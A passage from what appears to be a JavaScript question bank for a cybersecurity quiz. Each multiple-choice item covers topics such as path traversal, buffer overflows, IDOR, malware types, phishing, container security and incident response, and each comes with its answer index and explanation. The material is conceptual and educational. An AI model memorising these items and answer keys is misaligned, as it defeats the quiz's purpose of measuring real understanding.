        topic: "Command Injection"
    },
    {
        id: "cyber_security-143",
        question: "An application takes a user-supplied filename and opens it using `fopen()`. What is the primary mitigation against Path Traversal?",
        options: [
            "Encrypting the filename",
            "Validating and canonicalizing the input to ensure it does not contain `../` and resides in the allowed directory",
            "Using POST instead of GET",
            "Setting the HttpOnly cookie flag"
        ],
        answer: 1,
        explanation: "Mitigation requires sanitizing the input (removing `../`) and canonicalizing the path (resolving `.` and `..`) to verify the final absolute path is within the permitted directory.",
        difficulty: "Medium",
        topic: "Directory Traversal"
    },
    {
        id: "cyber_security-144",
        question: "What is the difference between a stack-based buffer overflow and a heap-based buffer overflow?",
        options: [
            "Stack overflows affect the program code, heap overflows affect the data",
            "Stack overflows overwrite memory in the call stack (often overwriting the return address), heap overflows overwrite dynamically allocated memory",
            "Heap overflows are easier to exploit than stack overflows",
            "Stack overflows only happen in C++, heap overflows only in Java"
        ],
        answer: 1,
        explanation: "Stack overflows target the static memory allocation of the call stack, typically hijacking the return pointer. Heap overflows target dynamically allocated memory and require different exploitation techniques.",
        difficulty: "Medium",
        topic: "Stack Overflow"
    },
    {
        id: "cyber_security-145",
        question: "What defensive mechanism randomizes the memory layout of a process to make buffer overflow exploits less reliable?",
        options: [
            "Data Execution Prevention (DEP)",
            "Address Space Layout Randomization (ASLR)",
            "Stack Canaries",
            "Control Flow Integrity (CFI)"
        ],
        answer: 1,
        explanation: "ASLR randomly arranges the address space positions of key data areas (like the stack and heap), making it difficult for an attacker to predict the location of malicious payloads.",
        difficulty: "Medium",
        topic: "Buffer Overflow"
    },
    {
        id: "cyber_security-146",
        question: "What is a 'Stack Canary'?",
        options: [
            "A type of malware",
            "A random value placed between the local variables and the return address on the stack to detect overflows",
            "A debugging tool for developers",
            "A firewall rule"
        ],
        answer: 1,
        explanation: "Before a function returns, it checks if the canary value has been altered. If it has, a buffer overflow likely occurred, and the program terminates before the return address is used.",
        difficulty: "Medium",
        topic: "Stack Overflow"
    },
    {
        id: "cyber_security-147",
        question: "An Integer Overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented. How can this lead to a security vulnerability?",
        options: [
            "It crashes the compiler",
            "It can lead to logical errors, such as allocating a smaller buffer than expected, which can then be overflowed",
            "It automatically encrypts the data",
            "It triggers a race condition"
        ],
        answer: 1,
        explanation: "If an integer overflow causes a length variable to wrap around to a small number, a subsequent memory allocation might be too small, leading to a heap buffer overflow when data is written.",
        difficulty: "Medium",
        topic: "Integer Overflow"
    },
    {
        id: "cyber_security-148",
        question: "A race condition occurs when:",
        options: [
            "Two threads execute the same code simultaneously without synchronization, leading to unexpected results",
            "A program runs faster than expected",
            "A user logs in from two different locations",
            "A firewall drops packets too quickly"
        ],
        answer: 0,
        explanation: "Race conditions happen when the timing of concurrent execution affects the outcome. Without proper locking (synchronization), threads can interfere with each other, corrupting data or bypassing security checks.",
        difficulty: "Medium",
        topic: "Race Conditions"
    },
    {
        id: "cyber_security-149",
        question: "What is a Time-of-Check to Time-of-Use (TOC/TOU) attack?",
        options: [
            "An attack that exploits slow network connections",
            "A race condition where the state of a resource is checked and then used, but the state is modified by an attacker between the check and the use",
            "An attack that bypasses antivirus scans",
            "A type of DDoS attack"
        ],
        answer: 1,
        explanation: "TOC/TOU exploits the window between when a system verifies a property (like file permissions) and when it actually uses the resource, allowing an attacker to swap the resource in between.",
        difficulty: "Medium",
        topic: "Race Conditions"
    },
    {
        id: "cyber_security-150",
        question: "An application uses a custom session token generation mechanism that simply increments a number: `sessid=12345`. What vulnerability does this present?",
        options: [
            "Session Fixation",
            "Session Prediction",
            "CSRF",
            "XSS"
        ],
        answer: 1,
        explanation: "Session prediction occurs when session tokens are generated using a predictable algorithm. An attacker can guess valid session IDs of other users by analyzing the pattern.",
        difficulty: "Medium",
        topic: "Broken Authentication"
    },
    {
        id: "cyber_security-151",
        question: "A user logs into a banking app, closes the laptop, and a colleague opens it. The colleague is now logged into the bank. Which secure coding practice was missed?",
        options: [
            "Input Validation",
            "Proper Session Timeout / Inactivity Logout",
            "Rate Limiting",
            "Encryption"
        ],
        answer: 1,
        explanation: "Applications handling sensitive data should implement automatic session termination after a period of inactivity to prevent unauthorized access if a device is left unattended.",
        difficulty: "Medium",
        topic: "Broken Authentication"
    },
    {
        id: "cyber_security-152",
        question: "An API endpoint returns a list of users but requires an administrative role. A standard user sends a GET request to the endpoint and receives the list. What is this?",
        options: [
            "Insecure Direct Object Reference (IDOR)",
            "Broken Access Control (Vertical Privilege Escalation)",
            "Security Misconfiguration",
            "SQL Injection"
        ],
        answer: 1,
        explanation: "Vertical privilege escalation occurs when a user can access functionality or data intended for users with higher privileges (like an admin) because the server fails to enforce access controls.",
        difficulty: "Medium",
        topic: "Broken Access Control"
    },
    {
        id: "cyber_security-153",
        question: "A user changes the `user_id=456` parameter in their URL to `user_id=789` and successfully views another user's profile. What is this vulnerability called?",
        options: [
            "Broken Access Control (Horizontal Privilege Escalation / IDOR)",
            "CSRF",
            "XSS",
            "Command Injection"
        ],
        answer: 0,
        explanation: "Insecure Direct Object Reference (IDOR) occurs when an application exposes internal implementation objects (like database IDs) directly, allowing a user to access other users' data by manipulating the reference.",
        difficulty: "Medium",
        topic: "Broken Access Control"
    },
    {
        id: "cyber_security-154",
        question: "Leaving detailed error messages (e.g., stack traces) enabled in a production environment is an example of which OWASP vulnerability?",
        options: [
            "Cryptographic Failures",
            "Security Misconfiguration",
            "Injection",
            "Broken Access Control"
        ],
        answer: 1,
        explanation: "Detailed errors aid attackers in understanding the application's internals, technologies used, and potential vulnerabilities, constituting a security misconfiguration.",
        difficulty: "Medium",
        topic: "Security Misconfiguration"
    },
    {
        id: "cyber_security-155",
        question: "A website transmits credit card numbers over HTTPS but stores them in plaintext in the database. Under the OWASP Top 10, this falls under which category?",
        options: [
            "Cryptographic Failures",
            "Security Misconfiguration",
            "Injection",
            "Identification and Authentication Failures"
        ],
        answer: 0,
        explanation: "OWASP renamed 'Sensitive Data Exposure' to 'Cryptographic Failures' to emphasize the root cause: failing to use strong encryption at rest.",
        difficulty: "Medium",
        topic: "Sensitive Data Exposure"
    },
    {
        id: "cyber_security-156",
        question: "Which OWASP API Security category describes the risk of exposing excessive amounts of data in a single API response (e.g., returning all user fields when only the name is needed)?",
        options: [
            "Broken Object Level Authorization",
            "Excessive Data Exposure",
            "Lack of Resources & Rate Limiting",
            "Mass Assignment"
        ],
        answer: 1,
        explanation: "Excessive Data Exposure occurs when an API returns more data than the client needs, often exposing sensitive fields that the frontend simply hides but doesn't filter.",
        difficulty: "Medium",
        topic: "OWASP API Top 10"
    },
    {
        id: "cyber_security-157",
        question: "In a REST API, what is the standard HTTP method used to update an existing resource partially?",
        options: [
            "PUT",
            "PATCH",
            "POST",
            "UPDATE"
        ],
        answer: 1,
        explanation: "While PUT typically replaces an entire resource, PATCH is used to apply partial modifications to a resource.",
        difficulty: "Medium",
        topic: "REST Security"
    },
    {
        id: "cyber_security-158",
        question: "A GraphQL API allows a user to request deeply nested relational data in a single query. If not properly restricted, what type of attack is this vulnerable to?",
        options: [
            "SQL Injection",
            "GraphQL Depth/Complexity Attack (Denial of Service)",
            "CSRF",
            "Broken Authentication"
        ],
        answer: 1,
        explanation: "Without query depth or complexity limits, an attacker can craft a deeply nested or highly complex query that consumes excessive CPU and memory, causing a DoS.",
        difficulty: "Medium",
        topic: "GraphQL Security"
    },
    {
        id: "cyber_security-159",
        question: "What is the primary purpose of Rate Limiting in API security?",
        options: [
            "To encrypt the API responses",
            "To prevent brute force, credential stuffing, and DoS attacks by limiting the number of requests a user can make in a timeframe",
            "To hide the API endpoints",
            "To enforce strong passwords"
        ],
        answer: 1,
        explanation: "Rate limiting throttles the number of requests an IP or user can make, mitigating automated attacks that rely on sending massive volumes of requests.",
        difficulty: "Medium",
        topic: "Rate Limiting"
    },
    {
        id: "cyber_security-160",
        question: "Which input validation approach is considered most secure?",
        options: [
            "Blacklisting known malicious characters",
            "Allowlisting (whitelisting) known good characters or formats",
            "Encoding all input",
            "Validating input only on the client side"
        ],
        answer: 1,
        explanation: "Allowlisting defines exactly what is permitted and rejects everything else. It is much more robust than blacklisting, which can easily be bypassed by obscure encodings or new attack vectors.",
        difficulty: "Medium",
        topic: "Input Validation"
    },
    {
        id: "cyber_security-161",
        question: "What is the difference between input validation and output encoding?",
        options: [
            "They are the same thing",
            "Input validation ensures data meets expected criteria before processing; output encoding neutralizes special characters before rendering in a specific context (like HTML)",
            "Input validation prevents SQLi; output encoding prevents XSS only",
            "Output encoding is done on the server; input validation is done on the client"
        ],
        answer: 1,
        explanation: "Validation ensures data is structurally correct (e.g., a valid email). Output encoding ensures that if the data contains special characters, they are treated as data, not code, in the output context.",
        difficulty: "Medium",
        topic: "Output Encoding"
    },
    {
        id: "cyber_security-162",
        question: "Which threat modeling methodology uses categories like Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege?",
        options: [
            "PASTA",
            "STRIDE",
            "DREAD",
            "OCTAVE"
        ],
        answer: 1,
        explanation: "STRIDE is a threat modeling framework developed by Microsoft that categorizes threats into these six specific types to help developers think systematically about potential attacks.",
        difficulty: "Medium",
        topic: "Threat Modeling"
    },
    {
        id: "cyber_security-163",
        question: "In risk assessment, what does the formula Risk = Threat x Vulnerability x Impact (or Risk = Likelihood x Impact) calculate?",
        options: [
            "The exact monetary loss of a breach",
            "The qualitative or quantitative level of risk to an asset",
            "The number of vulnerabilities in a system",
            "The speed at which an exploit spreads"
        ],
        answer: 1,
        explanation: "Risk assessment formulas combine the likelihood of a threat exploiting a vulnerability with the impact of that event to determine the overall risk level, aiding in prioritization.",
        difficulty: "Medium",
        topic: "Risk Assessment"
    },
    {
        id: "cyber_security-164",
        question: "What is the primary difference between a vulnerability assessment and a penetration test?",
        options: [
            "A vulnerability assessment is automated, a penetration test is always manual",
            "A vulnerability assessment identifies and quantifies vulnerabilities; a penetration test attempts to exploit them to prove impact",
            "A penetration test only checks network infrastructure",
            "A vulnerability assessment requires root access"
        ],
        answer: 1,
        explanation: "Vuln assessments provide a broad list of known vulnerabilities (often via automated scanners). Pentests go further by actively exploiting chains of vulnerabilities to demonstrate real-world impact.",
        difficulty: "Medium",
        topic: "Vulnerability Assessment"
    },
    {
        id: "cyber_security-165",
        question: "During a penetration test engagement, the tester is provided with no prior knowledge of the target system. What type of test is this?",
        options: [
            "White-box test",
            "Black-box test",
            "Gray-box test",
            "Crystal-box test"
        ],
        answer: 1,
        explanation: "A black-box test simulates a real-world external attack where the tester has no internal knowledge or credentials and must discover everything from scratch.",
        difficulty: "Medium",
        topic: "Penetration Testing"
    },
    {
        id: "cyber_security-166",
        question: "Which phase of ethical hacking involves passively or actively gathering information about the target from public sources, social media, and DNS?",
        options: [
            "Scanning",
            "Enumeration",
            "Reconnaissance (Footprinting)",
            "Exploitation"
        ],
        answer: 2,
        explanation: "Reconnaissance is the initial phase where the attacker gathers as much intelligence as possible about the target to identify potential entry points.",
        difficulty: "Medium",
        topic: "Reconnaissance"
    },
    {
        id: "cyber_security-167",
        question: "What tool is commonly used for network scanning and port discovery by sending crafted packets and analyzing the responses?",
        options: [
            "Wireshark",
            "Nmap",
            "Metasploit",
            "Burp Suite"
        ],
        answer: 1,
        explanation: "Nmap (Network Mapper) is the industry standard tool for network discovery and security auditing, used to find hosts, services, and open ports.",
        difficulty: "Medium",
        topic: "Scanning"
    },
    {
        id: "cyber_security-168",
        question: "Which technique involves actively querying a system to extract valid usernames, shares, services, or configuration details?",
        options: [
            "Passive Reconnaissance",
            "Enumeration",
            "Vulnerability Scanning",
            "Privilege Escalation"
        ],
        answer: 1,
        explanation: "Enumeration is the process of actively connecting to a target to extract detailed information (like user accounts or network shares) that is crucial for planning an exploit.",
        difficulty: "Medium",
        topic: "Enumeration"
    },
    {
        id: "cyber_security-169",
        question: "After successfully exploiting a vulnerability and gaining a low-level shell, a pentester uses `sudo -l` or looks for SUID binaries. What phase are they in?",
        options: [
            "Exploitation",
            "Privilege Escalation",
            "Lateral Movement",
            "Exfiltration"
        ],
        answer: 1,
        explanation: "Privilege escalation involves moving from a low-level user (like a standard web shell) to a higher-level user (like root or administrator) to gain full control of the system.",
        difficulty: "Medium",
        topic: "Privilege Escalation"
    },
    {
        id: "cyber_security-170",
        question: "What is Lateral Movement in the context of a cyber attack?",
        options: [
            "Escalating privileges on a single machine",
            "Moving from one compromised system to another within the same network to find valuable data or domain controllers",
            "Attacking the target from the internet",
            "Deleting logs to cover tracks"
        ],
        answer: 1,
        explanation: "Lateral movement is the process of navigating through a network after gaining initial access, typically using techniques like pass-the-hash or RDP to reach high-value targets.",
        difficulty: "Medium",
        topic: "Lateral Movement"
    },
    {
        id: "cyber_security-171",
        question: "An attacker establishes a reverse shell and modifies registry keys or cron jobs to ensure the shell restarts even if the server reboots. What is this technique called?",
        options: [
            "Persistence",
            "Privilege Escalation",
            "Exfiltration",
            "Pivoting"
        ],
        answer: 0,
        explanation: "Persistence mechanisms (like backdoor accounts, scheduled tasks, or registry run keys) ensure the attacker maintains access to the system over time, surviving reboots and credential changes.",
        difficulty: "Medium",
        topic: "Persistence"
    },
    {
        id: "cyber_security-172",
        question: "Which type of malware replicates itself across a network without requiring a host file or user interaction?",
        options: [
            "Virus",
            "Worm",
            "Trojan",
            "Rootkit"
        ],
        answer: 1,
        explanation: "Worms are self-replicating malware that spread over network connections, exploiting vulnerabilities to jump from one machine to another automatically.",
        difficulty: "Medium",
        topic: "Worm"
    },
    {
        id: "cyber_security-173",
        question: "What is the defining characteristic of Spyware?",
        options: [
            "It encrypts files",
            "It secretly monitors user activity, such as keystrokes or browsing habits, and sends it to a third party",
            "It displays unwanted advertisements",
            "It self-replicates over the network"
        ],
        answer: 1,
        explanation: "Spyware is designed to gather information about a person or organization without their knowledge, often logging keystrokes (keyloggers) or capturing screen data.",
        difficulty: "Medium",
        topic: "Spyware"
    },
    {
        id: "cyber_security-174",
        question: "How does Adware typically monetize its presence on a system?",
        options: [
            "By stealing credit card details",
            "By displaying intrusive advertisements, often bundled with free software",
            "By mining cryptocurrency",
            "By launching DDoS attacks"
        ],
        answer: 1,
        explanation: "Adware generates revenue for its creators by automatically displaying or downloading advertising material (like pop-ups or banners) to the user.",
        difficulty: "Medium",
        topic: "Adware"
    },
    {
        id: "cyber_security-175",
        question: "What distinguishes a Rootkit from standard malware?",
        options: [
            "It spreads via email",
            "It provides privileged access while actively hiding its presence from the OS and security software",
            "It only targets mobile devices",
            "It is always installed manually by an administrator"
        ],
        answer: 1,
        explanation: "Rootkits use advanced techniques (like hooking system calls or modifying the kernel) to conceal themselves, making them extremely difficult to detect and remove.",
        difficulty: "Medium",
        topic: "Rootkit"
    },
    {
        id: "cyber_security-176",
        question: "What is a Keylogger?",
        options: [
            "A tool to manage SSH keys",
            "Malware or hardware that records every keystroke made on a keyboard",
            "A system for managing digital certificates",
            "A type of firewall rule"
        ],
        answer: 1,
        explanation: "Keyloggers capture and record sequential keystrokes, allowing attackers to harvest passwords, credit card numbers, and confidential messages.",
        difficulty: "Medium",
        topic: "Keylogger"
    },
    {
        id: "cyber_security-177",
        question: "A network of compromised computers controlled by a central command-and-control (C2) server is known as a:",
        options: [
            "Rootkit",
            "Botnet",
            "Worm",
            "Ransomware network"
        ],
        answer: 1,
        explanation: "A botnet is a collection of infected machines (zombies/bots) that are controlled remotely by an attacker to execute large-scale attacks like DDoS or spam campaigns.",
        difficulty: "Medium",
        topic: "Botnet"
    },
    {
        id: "cyber_security-178",
        question: "Modern ransomware often employs 'double extortion'. What does this mean?",
        options: [
            "It encrypts the files twice using different algorithms",
            "It encrypts the files and also threatens to leak the stolen data publicly if the ransom is not paid",
            "It demands payment in two different cryptocurrencies",
            "It targets both Windows and Linux systems simultaneously"
        ],
        answer: 1,
        explanation: "Double extortion combines encryption with data theft. Even if the victim has backups and refuses to pay for the decryption key, the attacker threatens to release sensitive data.",
        difficulty: "Medium",
        topic: "Ransomware"
    },
    {
        id: "cyber_security-179",
        question: "A phishing attack is highly customized for a specific individual, using their name, job title, and recent activities. What is this called?",
        options: [
            "Whaling",
            "Spear Phishing",
            "Vishing",
            "Pharming"
        ],
        answer: 1,
        explanation: "Spear phishing is a targeted email attack directed at a specific person or organization, leveraging gathered personal information to appear highly legitimate.",
        difficulty: "Medium",
        topic: "Spear Phishing"
    },
    {
        id: "cyber_security-180",
        question: "An attacker sends a fake SMS text message claiming to be from a package delivery service with a link to track a package. What is this attack called?",
        options: [
            "Vishing",
            "Smishing",
            "Pharming",
            "Spamming"
        ],
        answer: 1,
        explanation: "Smishing (SMS Phishing) uses text messages to trick victims into clicking malicious links or revealing sensitive information.",
        difficulty: "Medium",
        topic: "Smishing"
    },
    {
        id: "cyber_security-181",
        question: "What is Pharming?",
        options: [
            "Attacking a specific individual via email",
            "Modifying DNS records or host files to redirect legitimate website traffic to a fraudulent site",
            "Harvesting credentials using a fake Wi-Fi hotspot",
            "Sending spam from a compromised server"
        ],
        answer: 1,
        explanation: "Pharming is a cyberattack intended to redirect a website's traffic to a different, fake website by exploiting vulnerabilities in DNS or altering local host files.",
        difficulty: "Medium",
        topic: "Social Engineering"
    },
    {
        id: "cyber_security-182",
        question: "An attacker connects to a public Wi-Fi hotspot and configures their laptop to act as a rogue access point with the same SSID as the legitimate one. What attack is this?",
        options: [
            "ARP Spoofing",
            "Evil Twin Attack",
            "DNS Cache Poisoning",
            "VLAN Hopping"
        ],
        answer: 1,
        explanation: "An Evil Twin attack uses a fake wireless access point with the same name as a legitimate one to trick users into connecting, allowing the attacker to intercept traffic.",
        difficulty: "Medium",
        topic: "Social Engineering"
    },
    {
        id: "cyber_security-183",
        question: "In an ARP Spoofing attack, what is the attacker's primary objective?",
        options: [
            "To crash the ARP table",
            "To associate their MAC address with the IP address of a legitimate device (like the default gateway) to intercept traffic",
            "To encrypt the ARP packets",
            "To block all network traffic"
        ],
        answer: 1,
        explanation: "By sending forged ARP messages, the attacker tricks the target machine into sending its traffic to the attacker's MAC address instead of the real router, enabling a MITM attack.",
        difficulty: "Medium",
        topic: "ARP Spoofing"
    },
    {
        id: "cyber_security-184",
        question: "How can an organization technically mitigate ARP Spoofing on their internal network?",
        options: [
            "Using a VPN",
            "Implementing Dynamic ARP Inspection (DAI) on managed switches",
            "Installing an IDS",
            "Using HTTPS everywhere"
        ],
        answer: 1,
        explanation: "DAI is a switch security feature that validates ARP packets in a network. It intercepts all ARP requests and replies and verifies them against a trusted database (like DHCP snooping bindings).",
        difficulty: "Medium",
        topic: "ARP Poisoning"
    },
    {
        id: "cyber_security-185",
        question: "What is a Replay Attack?",
        options: [
            "Re-sending a captured, valid message or authentication packet to trick the system into granting access",
            "Recording a phone call and playing it back later",
            "Rebooting a server to bypass security controls",
            "Re-executing an exploited buffer overflow"
        ],
        answer: 0,
        explanation: "In a replay attack, an attacker intercepts a valid transmission (like a login request or authentication token) and delays or resends it to gain unauthorized access.",
        difficulty: "Medium",
        topic: "Replay Attack"
    },
    {
        id: "cyber_security-186",
        question: "Which security mechanism is most effective at preventing replay attacks?",
        options: [
            "Encryption",
            "Nonces (random numbers used once) or Timestamps",
            "Complex passwords",
            "Firewalls"
        ],
        answer: 1,
        explanation: "Including a nonce (a unique, random value for each request) or a strict timestamp in the message ensures that old, captured messages cannot be successfully replayed.",
        difficulty: "Medium",
        topic: "Replay Attack"
    },
    {
        id: "cyber_security-187",
        question: "What is the difference between Session Hijacking and Session Fixation?",
        options: [
            "Session Hijacking steals an active session ID; Session Fixation forces a user to use a session ID chosen by the attacker before they log in",
            "Session Fixation steals an active session ID; Session Hijacking forces a user to use a chosen ID",
            "They are the same attack",
            "Session Hijacking only works over HTTPS"
        ],
        answer: 0,
        explanation: "In fixation, the attacker sets the user's session ID beforehand. In hijacking, the attacker steals a valid session ID after the user has authenticated.",
        difficulty: "Medium",
        topic: "Session Hijacking"
    },
    {
        id: "cyber_security-188",
        question: "Which password attack involves trying every possible combination of characters until the correct password is found?",
        options: [
            "Dictionary Attack",
            "Brute Force Attack",
            "Credential Stuffing",
            "Rainbow Table Attack"
        ],
        answer: 1,
        explanation: "A brute force attack systematically checks all possible passwords from a character set until the correct one is found, guaranteeing success given enough time.",
        difficulty: "Medium",
        topic: "Brute Force"
    },
    {
        id: "cyber_security-189",
        question: "How does a Dictionary Attack differ from a Brute Force Attack?",
        options: [
            "It tries every combination, but slower",
            "It uses a list of common words and leaked passwords (a wordlist) instead of trying every possible combination",
            "It targets the encryption algorithm instead of the password",
            "It requires physical access to the machine"
        ],
        answer: 1,
        explanation: "Dictionary attacks use a pre-compiled list of likely passwords (like 'Password123' or words from a dictionary), making them much faster than brute force if the password is weak.",
        difficulty: "Medium",
        topic: "Dictionary Attack"
    },
    {
        id: "cyber_security-190",
        question: "An attacker intercepts network traffic and captures a user's session cookie. They then inject this cookie into their own browser. What type of attack is this?",
        options: [
            "CSRF",
            "XSS",
            "Session Hijacking (Sidejacking)",
            "Clickjacking"
        ],
        answer: 2,
        explanation: "Sidejacking specifically refers to stealing an unencrypted session cookie (often over HTTP) and using it to hijack the user's session.",
        difficulty: "Medium",
        topic: "Session Hijacking"
    },
    {
        id: "cyber_security-191",
        question: "A volumetric DDoS attack aims to consume all available bandwidth of the target network. Which of the following is a common protocol used in volumetric attacks?",
        options: [
            "TCP SYN",
            "UDP",
            "HTTP POST",
            "SSH"
        ],
        answer: 1,
        explanation: "UDP floods are classic volumetric attacks because UDP is connectionless, allowing attackers to send massive amounts of spoofed UDP packets to random ports, overwhelming the network.",
        difficulty: "Medium",
        topic: "UDP Flood"
    },
    {
        id: "cyber_security-192",
        question: "What is an ICMP Flood attack?",
        options: [
            "Sending oversized ICMP packets to fragment the target",
            "Overwhelming the target with ICMP Echo Request (ping) packets, forcing it to reply and consume resources",
            "Sending ICMP redirects to change routing tables",
            "Using ICMP to bypass a firewall"
        ],
        answer: 1,
        explanation: "An ICMP (Ping) flood overwhelms the target with echo requests. The target must process each request and send a reply, exhausting its CPU and bandwidth.",
        difficulty: "Medium",
        topic: "ICMP Flood"
    },
    {
        id: "cyber_security-193",
        question: "In AWS, what is the Principle of Least Privilege best implemented as when assigning permissions to an EC2 instance?",
        options: [
            "Attaching the AdministratorAccess IAM role",
            "Attaching an IAM Role with only the specific permissions needed for that instance's task (e.g., read-only access to one S3 bucket)",
            "Using the root account credentials",
            "Creating an IAM user and putting the access keys on the instance"
        ],
        answer: 1,
        explanation: "Using IAM roles with scoped-down policies ensures the EC2 instance can only perform the exact actions required, minimizing blast radius if compromised.",
        difficulty: "Medium",
        topic: "AWS Security Basics"
    },
    {
        id: "cyber_security-194",
        question: "In Azure, what service is used to centrally manage, create, and store secrets (like passwords and connection strings) used by cloud applications?",
        options: [
            "Azure Active Directory",
            "Azure Key Vault",
            "Azure Sentinel",
            "Azure Storage"
        ],
        answer: 1,
        explanation: "Azure Key Vault is a cloud service for securely storing and accessing secrets, keys, and certificates, integrating tightly with Azure services for secure secret management.",
        difficulty: "Medium",
        topic: "Azure Security Basics"
    },
    {
        id: "cyber_security-195",
        question: "What is the primary security risk of hardcoding API keys or database credentials directly in application source code?",
        options: [
            "The code will run slower",
            "If the code is pushed to a version control system (like GitHub), anyone with access can see the credentials",
            "The compiler will fail to build the code",
            "It violates GDPR"
        ],
        answer: 1,
        explanation: "Source code repositories are often shared or accidentally made public. Hardcoded secrets in code are easily leaked and are a leading cause of cloud breaches.",
        difficulty: "Medium",
        topic: "Secrets Management"
    },
    {
        id: "cyber_security-196",
        question: "What is the primary purpose of a Hardware Security Module (HSM) in key management?",
        options: [
            "To generate passwords faster",
            "To provide secure, tamper-resistant generation, storage, and management of cryptographic keys",
            "To act as a software-based firewall",
            "To scan for malware in memory"
        ],
        answer: 1,
        explanation: "HSMs are physical computing devices that safeguard and manage digital keys for strong authentication, providing cryptoprocessing that is resistant to physical tampering.",
        difficulty: "Medium",
        topic: "Key Management"
    },
    {
        id: "cyber_security-197",
        question: "Why is running a Docker container with the `--privileged` flag considered a security risk in production?",
        options: [
            "It makes the container run faster",
            "It grants the container full access to the host system's capabilities, effectively breaking the isolation model",
            "It prevents the container from accessing the network",
            "It encrypts the container's file system"
        ],
        answer: 1,
        explanation: "The `--privileged` flag disables all security restrictions, giving the container root access to the host's devices, kernel, and filesystem, negating container isolation.",
        difficulty: "Medium",
        topic: "Docker Security"
    },
    {
        id: "cyber_security-198",
        question: "In container security, what is an 'image vulnerability'?",
        options: [
            "A misconfiguration in the Docker daemon",
            "Known software vulnerabilities (CVEs) present in the OS packages or libraries included in the container image",
            "A weak password on the container registry",
            "A network vulnerability in the bridge network"
        ],
        answer: 1,
        explanation: "Container images are built from base OS layers and dependencies. If these components have known CVEs, every container spun from that image inherits those vulnerabilities.",
        difficulty: "Medium",
        topic: "Container Security"
    },
    {
        id: "cyber_security-199",
        question: "What is the primary function of a Kubernetes Network Policy?",
        options: [
            "To manage user authentication to the cluster",
            "To control traffic flow at the IP address or port level (Layer 3/4) between pods in a cluster",
            "To encrypt all pod-to-pod traffic",
            "To manage storage volumes"
        ],
        answer: 1,
        explanation: "Kubernetes Network Policies allow you to specify how pods are allowed to communicate with each other and with other network endpoints, enforcing micro-segmentation.",
        difficulty: "Medium",
        topic: "Kubernetes Security"
    },
    {
        id: "cyber_security-200",
        question: "Which Kubernetes object is used to store sensitive data, like passwords or OAuth tokens, separately from pod definitions?",
        options: [
            "ConfigMap",
            "Secret",
            "PodSpec",
            "Deployment"
        ],
        answer: 1,
        explanation: "Kubernetes Secrets are intended to hold confidential data. Unlike ConfigMaps, they are designed to be used in ways that minimize exposure (e.g., mounted as tmpfs volumes in memory).",
        difficulty: "Medium",
        topic: "Kubernetes Security"
    },
    {
        id: "cyber_security-201",
        question: "What is the goal of shifting security left in a DevSecOps pipeline?",
        options: [
            "Moving the security team's desks to the development side of the office",
            "Integrating security testing (like SAST and DAST) earlier in the software development lifecycle, rather than at the end",
            "Delaying production releases to allow for more security scanning",
            "Removing security testing to speed up deployment"
        ],
        answer: 1,
        explanation: "Shifting left means finding and fixing security vulnerabilities during the coding and building phases, which is cheaper and faster than finding them in production.",
        difficulty: "Medium",
        topic: "DevSecOps"
    },
    {
        id: "cyber_security-202",
        question: "What is the difference between Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST)?",
        options: [
            "SAST analyzes source code without running it; DAST tests the running application from the outside",
            "SAST tests the running application; DAST analyzes source code",
            "SAST only finds logic errors; DAST only finds configuration errors",
            "There is no difference; they are synonymous"
        ],
        answer: 0,
        explanation: "SAST (white-box) analyzes the source code, bytecode, or binaries for vulnerabilities. DAST (black-box) interacts with a running application, simulating real-world attacks.",
        difficulty: "Medium",
        topic: "Secure SDLC"
    },
    {
        id: "cyber_security-203",
        question: "What does Code Signing provide?",
        options: [
            "Encryption of the source code",
            "Verification of the author's identity and assurance that the code has not been tampered with since it was signed",
            "Obfuscation of the compiled binary",
            "A faster compilation process"
        ],
        answer: 1,
        explanation: "Code signing uses digital certificates to authenticate the software publisher and validate that the code has not been altered by a third party.",
        difficulty: "Medium",
        topic: "Code Signing"
    },
    {
        id: "cyber_security-204",
        question: "Which compliance framework specifically mandates the protection of Personally Identifiable Information (PII) for individuals within the European Union?",
        options: [
            "PCI DSS",
            "HIPAA",
            "GDPR",
            "SOX"
        ],
        answer: 2,
        explanation: "The General Data Protection Regulation (GDPR) is a European Union law that governs data privacy and the protection of EU citizens' personal data.",
        difficulty: "Medium",
        topic: "GDPR"
    },
    {
        id: "cyber_security-205",
        question: "A hospital implements security controls to protect electronic Protected Health Information (ePHI). Which compliance framework are they most likely adhering to?",
        options: [
            "PCI DSS",
            "HIPAA",
            "NIST SP 800-53",
            "CIS Controls"
        ],
        answer: 1,
        explanation: "The Health Insurance Portability and Accountability Act (HIPAA) establishes national standards for the protection of health information in the US.",
        difficulty: "Medium",
        topic: "HIPAA"
    },
    {
        id: "cyber_security-206",
        question: "Which standard applies to any organization that stores, processes, or transmits credit card information?",
        options: [
            "ISO 27001",
            "PCI DSS",
            "GDPR",
            "FISMA"
        ],
        answer: 1,
        explanation: "The Payment Card Industry Data Security Standard (PCI DSS) is a set of security requirements designed to ensure that all companies processing credit card data maintain a secure environment.",
        difficulty: "Medium",
        topic: "PCI DSS"
    },
    {
        id: "cyber_security-207",
        question: "What is the primary focus of NIST Cybersecurity Framework (CSF)?",
        options: [
            "Mandating specific technical tools",
            "Providing a policy framework of guidelines and best practices for managing cybersecurity risk",
            "Certifying individual security professionals",
            "Replacing ISO 27001"
        ],
        answer: 1,
        explanation: "The NIST CSF provides a voluntary framework consisting of standards, guidelines, and best practices to manage cybersecurity risk, organized around five core functions: Identify, Protect, Detect, Respond, Recover.",
        difficulty: "Medium",
        topic: "NIST"
    },
    {
        id: "cyber_security-208",
        question: "Why is centralized logging important for incident response?",
        options: [
            "It reduces the storage space needed",
            "It allows security teams to correlate events across multiple systems and establish a timeline of an attack",
            "It prevents attackers from deleting logs",
            "It is required by all firewalls"
        ],
        answer: 1,
        explanation: "Without centralized logging, analysts would have to log into dozens of individual servers to piece together an attack. Centralization enables correlation and faster investigation.",
        difficulty: "Medium",
        topic: "Logging"
    },
    {
        id: "cyber_security-209",
        question: "What is the first step in the Incident Response (IR) process according to standard frameworks like NIST?",
        options: [
            "Containment",
            "Eradication",
            "Preparation",
            "Recovery"
        ],
        answer: 2,
        explanation: "Preparation involves establishing IR policies, training teams, and deploying tools (like SIEM) before an incident occurs, as it is foundational to a successful response.",
        difficulty: "Medium",
        topic: "Incident Response"
    },
    {
        id: "cyber_security-210",
        question: "During incident response, what is the goal of the 'Containment' phase?",
        options: [
            "To find the root cause",
            "To limit the damage and prevent further spread of the incident",
            "To restore systems from backup",
